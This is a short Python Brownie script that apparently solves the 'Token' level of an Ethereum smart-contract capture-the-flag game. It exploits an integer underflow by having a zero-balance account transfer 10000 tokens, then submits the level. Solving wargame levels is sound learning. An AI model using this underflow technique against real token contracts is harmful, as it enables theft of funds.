from brownie import Token

from scripts.helpful_scripts import (
    get_account,
    get_level_contract,
    submit_instance,
    print_out_if_level_solved,
)

LEVEL_NAME = "05_token"
INTERFACE_CONTRACT = Token


def solve_level(level_contract):
    account = get_account()
    account_1 = get_account(1)
    print(f"Started to solve {LEVEL_NAME}")
    tx = level_contract.transfer(account, 10000, {"from": account_1})
    tx.wait(1)


# brownie run scripts/_05_token.py --network rinkeby-fork
def main():
    level_contract = get_level_contract(LEVEL_NAME, INTERFACE_CONTRACT)
    solve_level(level_contract)
    level_solved = submit_instance(level_contract.address)
    print_out_if_level_solved(level_solved, LEVEL_NAME)
    return level_solved
